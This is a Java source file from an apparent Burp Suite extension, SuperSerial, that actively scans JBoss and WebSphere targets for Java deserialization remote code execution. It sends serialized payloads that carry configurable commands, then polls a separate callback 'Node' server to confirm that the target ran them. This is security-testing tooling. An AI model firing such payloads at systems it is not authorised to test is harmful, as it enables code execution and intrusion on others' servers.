/*
	NodeScannerCheck.java
	
	0.5.0.1 (11/22/2016)
	
	Active Scan check to detect Java Deserialization Remote Code Execution using the SuperSerial Node.
*/

package burp;

import java.util.Hashtable;
import java.util.Iterator;
import java.util.List;
import java.util.ArrayList;
import java.util.Properties;
import java.util.Arrays;
import java.io.OutputStream;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.net.URL;

import org.json.JSONObject;

public class NodeScannerCheck extends SuperSerialScannerCheck {
	private IHttpService nodeHttpService;
	
	private static final String JBOSS_INSERTION_POINT = "SuperSerial-JBoss";
	private static final String WEBSPHERE_INSERTION_POINT = "SuperSerial-WebSphere";
	
	public NodeScannerCheck(IBurpExtenderCallbacks cb) {
		super(cb);
		nodeHttpService = null;
	}
	
	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue,IScanIssue newIssue) {
		return -1;
	}
	
	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,IScannerInsertionPoint insertionPoint) {
		List<IScanIssue> issues = null;
		String ipName = insertionPoint.getInsertionPointName();
		String nodePath = null;
		String token = settings.getNodeToken();
		
		if(!settings.getNodeCollaborator() && (ipName.equals(JBOSS_INSERTION_POINT) || ipName.equals(WEBSPHERE_INSERTION_POINT))) { //insertion point is SuperSerial custom insertion point
			
			IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
			URL url = reqInfo.getUrl();
			String urlStr = url.getProtocol()+"://"+url.getHost()+":"+url.getPort()+url.getPath();
			if(!createNodeHttpService()) { //node settings invalid
				callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid Node connection settings! Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				callbacks.issueAlert("Invalid SuperSerial Node connection settings! Active Scans check will be skipped on "+url.getPath()+"! Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				return issues;
			}
			String host = settings.getNodeHost();
			int port = settings.getNodePort();
			boolean https = settings.getNodeHttps();
			token = settings.getNodeToken();
			int downloadTries = settings.getDownloadTries();
			int waitTime = settings.getWaitTime();
			
			//request #1: create node context
			byte[] req = getNodeGetRequest("/queue",token);
			IHttpRequestResponse queueRR = callbacks.makeHttpRequest(nodeHttpService,req);
			byte[] resp = queueRR.getResponse();
			IResponseInfo respInfo = null;
			if(resp!=null) {
				respInfo = helpers.analyzeResponse(resp);
			} else { //connection to node failed (error/timeout)
				callbacks.printError("Active Scan checks aborted on "+urlStr+" due to failed failed Node Connection. Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				callbacks.issueAlert("Connection to Node failed during scanning! Active Scan checks on "+url.getPath()+" will be aborted! Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				//configTab.setStatusError(SuperSerialConfigTab.CONN_ERROR_CODE,host,port,https,true);
				return issues;
			}
			if(respInfo!=null && respInfo.getStatusCode()==200) { //queue request completed successfully
				//copy response data to string
				int dataStart = respInfo.getBodyOffset();
				byte[] dataArray = new byte[resp.length-dataStart];
				int i=dataStart;
				int j=0;
				while(i<resp.length) {
					dataArray[j] = resp[i];
					i++;
					j++;
				}
				String data = new String(dataArray);
				
				//parse response JSON
				JSONObject jsonObj = new JSONObject(data);
				nodePath = (String) jsonObj.get("path");
				
				if(nodePath==null) { //if Node does not return a context to use (maybe not a node afterall?), issue error alert and abort active scan
					callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid Node connection settings (configured node web server not a node)! Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
					callbacks.issueAlert("Invalid SuperSerial Node connection settings (configured node web server not a node)! Active Scans check will be skipped! Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
					return issues;
				}
				
				//get list of commands to test, issue error alert and abort active scan if empty
				Hashtable[] commands = pcf.getCommandsArray();
				if(commands.length==0) {
					callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid scan settings (no commands to test with)! Add at least one command in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
					callbacks.issueAlert("Invalid SuperSerial scan settings: no commands to test! Active scan checks will be skipped! Add at least one command in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
					return issues;
				}
				
				//get list of enabled payload types, issue error alert and abort active scan if none enabled
				String[] payloadTypes = ptf.getEnabledTypes();
				if(payloadTypes.length==0) {
					callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid scan settings (no payload types enabled)! Enable at least one payload type in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
					callbacks.issueAlert("Invalid SuperSerial scan settings: no payload types enabled! Active scan checks will be skipped! Enable at least one payload type in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
					return issues;
				}
				
				boolean nodeConnError = false; //whether a connection error/timeout occurred during scanning
				for(i=0;!nodeConnError && i<payloadTypes.length;i++) { //loop through payload types
					
					for(j=0;!nodeConnError && j<commands.length;j++) { //loop through commands, stop if node access/file upload is detected
						String technique = payloadTypes[i];
						Hashtable cmdHT = commands[j];
						String cmd = (String) cmdHT.get("cmd");
						cmd = makeCommand(cmd,nodeHttpService.getProtocol(),nodeHttpService.getHost(),nodeHttpService.getPort(),nodePath,token,technique);
						//callbacks.printError(urlStr+":\n\tType: "+technique+"; cmd: "+cmd);
						
						//Request #2: create payload using current technique, and send to target host
						byte[] payload = generator.generatePayload(technique,cmd);
						if(payload.length==1) { //payload generation failed, move onto next command
							continue;
						}
						req = insertionPoint.buildRequest(payload);
						//callbacks.printError((new String(req))+"\n\n");
						IHttpRequestResponse exploitRR = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),req);
						//callbacks.printError(new String(exploitRR.getResponse()));
						
						//create exploit request highlights (content-type (if applicable) and command), but do not apply until vuln is confirmed
						List<int[]> expReqHighlights = null;
						String param = null;
						String encoding = null;
						String platform = null;
						int cmdStart = helpers.indexOf(req,cmd.getBytes(),true,0,req.length); //check for clear-text command
						if(cmdStart>-1) {
							expReqHighlights = new ArrayList<int[]>(2);
							int ctStart = helpers.indexOf(req,JBossSerializedInsertionPoint.CONTENT_TYPE.getBytes(),true,0,req.length); //check for java-serialized-object content-type header
							if(ctStart>-1) {
								expReqHighlights.add(new int[] {ctStart,ctStart+JBossSerializedInsertionPoint.CONTENT_TYPE.length()});
							}
							expReqHighlights.add(new int[] {cmdStart,cmdStart+cmd.length()});
							platform = "JBoss";
						} else {
							String encodedPayload = helpers.base64Encode(payload);
							cmdStart = helpers.indexOf(req,encodedPayload.getBytes(),true,0,req.length); //check for base64-encoded payload object
							if(cmdStart>-1) {
								expReqHighlights = new ArrayList<int[]>(1);
								expReqHighlights.add(new int[] {cmdStart,cmdStart+encodedPayload.length()});
								platform = "WebSphere";
								encoding = "base64";
								param = insertionPoint.getBaseValue(); //get parameter name where payload is inserted after encoding
							} else {
								encodedPayload = helpers.urlEncode(encodedPayload);
								cmdStart = helpers.indexOf(req,encodedPayload.getBytes(),true,0,req.length);
								if(cmdStart>-1) {
									expReqHighlights = new ArrayList<int[]>(1);
									expReqHighlights.add(new int[] {cmdStart,cmdStart+encodedPayload.length()});
									platform = "WebSphere";
									encoding = "base64";
									param = insertionPoint.getBaseValue(); //get parameter name where payload is inserted after encoding
								} else { //other encoding methods can be added here (such as full URL-Encode)
									
								}
							}
						}
						expReqHighlights = sortHighlightIndexList(expReqHighlights); //ensure that request highlights list is ordered correctly
						
						//create exploit response highlight (server header), but do not apply unless vuln is confirmed
						List<int[]> expRespHighlights = null;
						IResponseInfo expRespInfo = helpers.analyzeResponse(exploitRR.getResponse());
						String serverHeader = null;
						int ind = -1;
						List<String> expRespHeaders = expRespInfo.getHeaders();
						Iterator<String> expRespHeadersItr = expRespHeaders.iterator();
						while(expRespHeadersItr.hasNext()) {
							String header = expRespHeadersItr.next();
							if(header!=null && platform!=null && header.contains(platform)) {
								ind = header.indexOf(platform);
								serverHeader = header.substring(ind);
								break;
							}
						}
						if(serverHeader!=null) {
							expRespHighlights = new ArrayList<int[]>(1);
							ind = helpers.indexOf(exploitRR.getResponse(),serverHeader.getBytes(),true,0,exploitRR.getResponse().length);
							if(ind>-1) {
								expRespHighlights.add(new int[] {ind,ind+serverHeader.length()});
							}
						}
						expRespHighlights = sortHighlightIndexList(expRespHighlights); //ensure that response highlights list is ordered correctly
						
						//Request #3: loop to retrieve uploaded file or access entry
						IHttpRequestResponse fileRR = null;
						int tryCount=0;
						boolean downloaded = false; //if file was successfully downloaded from node
						while(!downloaded && tryCount<downloadTries) {
							try {
								Thread.sleep(waitTime);
							} catch(Exception e) {
								//don't care, wait time will not be used this time
							}
							req = getNodeGetRequest(nodePath,token);
							fileRR = callbacks.makeHttpRequest(nodeHttpService,req);
							resp = fileRR.getResponse();
							respInfo = null;
							if(resp!=null)
								respInfo = helpers.analyzeResponse(resp); 
							if(resp!=null && respInfo!=null) {
								if(respInfo.getStatusCode()==200) {
									downloaded = true;
									break;
								}
							} else { //error making request to node (timeout or failure)
								callbacks.printError("Active Scan checks aborted on "+urlStr+" due to failed failed Node Connection. Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
								callbacks.issueAlert("Connection to Node failed during scanning! Active Scan checks on "+url.getPath()+" will be aborted! Set settings in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
								//configTab.setStatusError(SuperSerialConfigTab.CONN_ERROR_CODE,host,port,https,true);
								nodeConnError = true;
								break;
							}
							tryCount++;
						}
						
						if(downloaded) { //data was downloaded from node, check if data is expected
							issues = new ArrayList<IScanIssue>(1);
							
							boolean expected = Boolean.parseBoolean((String) cmdHT.get("upload")); //whether uploaded file (true) or access entry (false) is expected
							boolean uploaded = false; //whether data read from node is uploaded file (true) or access entry (false)
							
							//determine whether data read is uploaded file or access entry by reading response headers
							List<String> respHeaders = respInfo.getHeaders();
							Iterator<String> headersItr = respHeaders.iterator();
							String source = null;
							String time = null;
							while(headersItr.hasNext()) {
								String header = headersItr.next();
								String[] headerSplit = null;
								if(header.contains("Upload-")) { //if response contains Upload-Source and Upload-Time headers, uploaded file was downloaded
									headerSplit = header.split(":",2);
									if(source==null & headerSplit[0].equalsIgnoreCase("Upload-Source") && headerSplit.length>1) {
										source = headerSplit[1].trim();
										uploaded = true;
									} else if(time==null && headerSplit[0].equalsIgnoreCase("Upload-Time") && headerSplit.length>1) {
										time = headerSplit[1].trim();
										uploaded = true;
									}
								} else if(header.contains("Content-")) { //if response contains "Content-Type: application/json" header, access entry was downloaded
									headerSplit = header.split(":",2);
									if(headerSplit[0].equalsIgnoreCase("Content-Type") && headerSplit.length>1) {
										headerSplit[1] = headerSplit[1].trim();
										if(headerSplit[1].equalsIgnoreCase("application/json")) {
											uploaded = false;
										}
									}
								}
							}
							
							if(expected==uploaded) { //if data downloaded was as expected: vuln confirmed, report vuln
								//if data is access entry, parse JSON
								if(!uploaded) {
									dataStart = respInfo.getBodyOffset();
									dataArray = new byte[resp.length-dataStart];
									int k=dataStart;
									int l=0;
									while(k<resp.length) {
										dataArray[l] = resp[k];
										k++;
										l++;
									}
									jsonObj = new JSONObject(new String(dataArray));
									source = (String) jsonObj.get("accessSource");
									time = (String) jsonObj.get("accessTime");
								}
								
								//create properties list for issue creation
								Properties issueDetailProps = new Properties();
								issueDetailProps.setProperty("node_type","SuperSerial Node");
								issueDetailProps.setProperty("node_location",host);
								issueDetailProps.setProperty("command",cmd);
								issueDetailProps.setProperty("technique",technique);
								issueDetailProps.setProperty("source",source);
								issueDetailProps.setProperty("time",time);
								issueDetailProps.setProperty("platform",platform);
								issueDetailProps.setProperty("os",(String) cmdHT.get("os"));
								if(uploaded) {
									issueDetailProps.setProperty("upload1"," and upload a file to");
									issueDetailProps.setProperty("upload2"," containing a file");
								} else {
									issueDetailProps.setProperty("upload1","");
									issueDetailProps.setProperty("upload2","");
								}
								if(param!=null) issueDetailProps.setProperty("parameter",param);
								if(encoding!=null) issueDetailProps.setProperty("encoding",encoding);
								
								//create node response highlight indices
								List<int[]> nodeRespHighlightsList = null;
								int srcStart = helpers.indexOf(resp,source.getBytes(),true,0,resp.length);
								if(srcStart>-1) { //source found
									nodeRespHighlightsList = new ArrayList<int[]>(4);
									nodeRespHighlightsList.add(new int[] {srcStart,srcStart+source.length()});
								}
								int timeStart = helpers.indexOf(resp,time.getBytes(),true,0,resp.length);
								if(timeStart>-1) { //time found
									if(nodeRespHighlightsList==null) nodeRespHighlightsList = new ArrayList<int[]>(3);
									nodeRespHighlightsList.add(new int[] {timeStart,timeStart+time.length()});
								}
								int techStart = helpers.indexOf(resp,technique.getBytes(),true,0,resp.length);
								if(techStart>-1) { //technique found
									if(nodeRespHighlightsList==null) nodeRespHighlightsList = new ArrayList<int[]>(2);
									nodeRespHighlightsList.add(new int[] {techStart,techStart+technique.length()});
								}
								if(uploaded) { //if data is uploaded file, highlight file
									nodeRespHighlightsList.add(new int[] {respInfo.getBodyOffset(),resp.length});
								}
								nodeRespHighlightsList = sortHighlightIndexList(nodeRespHighlightsList); //ensure that response highlights list is ordered correctly
								
								//create highlighted request/response and create issue
								IHttpRequestResponseWithMarkers exploitRRWM = callbacks.applyMarkers(exploitRR,expReqHighlights,expRespHighlights);
								IHttpRequestResponseWithMarkers fileRRWM = callbacks.applyMarkers(fileRR,null,nodeRespHighlightsList);
								if(encoding == null) { //payload not encoded
									BinaryPayloadIssue issue = new BinaryPayloadIssue(callbacks,exploitRRWM,fileRRWM,issueDetailProps);
									issues.add(issue);
								} else { //payload encoded
									EncodedPayloadIssue issue = new EncodedPayloadIssue(callbacks,exploitRRWM,fileRRWM,issueDetailProps);
									issues.add(issue);
								}
								return issues;
							}
						}
					}
				}
			} else { //queue request failed (wrong token)
				callbacks.printError("Active Scan checks aborted on "+urlStr+" due to failed Node Authentication. Set correct token in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				callbacks.issueAlert("Authentication to Node failed during scanning! Active Scan checks on "+url.getPath()+" will be aborted! Set correct token in the "+settings.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				//configTab.setStatusError(SuperSerialConfigTab.AUTH_ERROR_CODE,host,port,https,true);
			}
		}
		
		//if this point is reached (no vulnerability detected), attempt to delete context on Node that was created for current scan.
		if(nodePath != null) {
			byte[] req = getNodeDeleteRequest(nodePath,token);
			IHttpRequestResponse queueRR = callbacks.makeHttpRequest(nodeHttpService,req);
		}
		return issues;
	}
	
	//create HTTP GET request to node
	private byte[] getNodeGetRequest(String nodePath,String nodeToken) {
		if(nodePath.charAt(0)!='/') nodePath = "/"+nodePath;
		String request = "GET "+nodePath+"?token="+nodeToken+" HTTP/1.1\r\nHost: "+nodeHttpService.getHost()+":"+Integer.toString(nodeHttpService.getPort())+"\r\n\r\n";
		return request.getBytes();
	}
	
	//create HTTP DELETE request to node
	private byte[] getNodeDeleteRequest(String nodePath,String nodeToken) {
		if(nodePath.charAt(0)!='/') nodePath = "/"+nodePath;
		String request = "DELETE "+nodePath+"?token="+nodeToken+" HTTP/1.1\r\nHost: "+nodeHttpService.getHost()+":"+Integer.toString(nodeHttpService.getPort())+"\r\n\r\n";
		return request.getBytes();
	}
	
	//create new httpservice to be used for requests to node
	//false: failure creating new httpservice
	//true: success creating new httpservice (or identical httpservice already created)
	private boolean createNodeHttpService() {
		String host = settings.getNodeHost();
		int port = settings.getNodePort();
		boolean https = settings.getNodeHttps();
		
		if((host==null) || ((port<1) || (port>65535))) { //node settings not yet set or set incorrectly
			return false;
		} else if(host.isEmpty() || ((port<1) || (port>65535))) { //node settings not set correctly
			return false;
		}
		
		if(nodeHttpService==null) { //HttpService object not yet created, attempt to create			
			nodeHttpService = helpers.buildHttpService(host,port,https);
		} else { //HttpService object already created, compare to inputted settings and recreate if different
			String currHost = nodeHttpService.getHost();
			int currPort = nodeHttpService.getPort();
			String currHttps = nodeHttpService.getProtocol();
			if(!(currHost.equals(host) && (currPort==port) && (currHttps.equalsIgnoreCase("http"+(https ? "s" : ""))))) { //if already-created object is set differently than current settings
				nodeHttpService = helpers.buildHttpService(host,port,https);
			}
		}
		return true;
	}
}
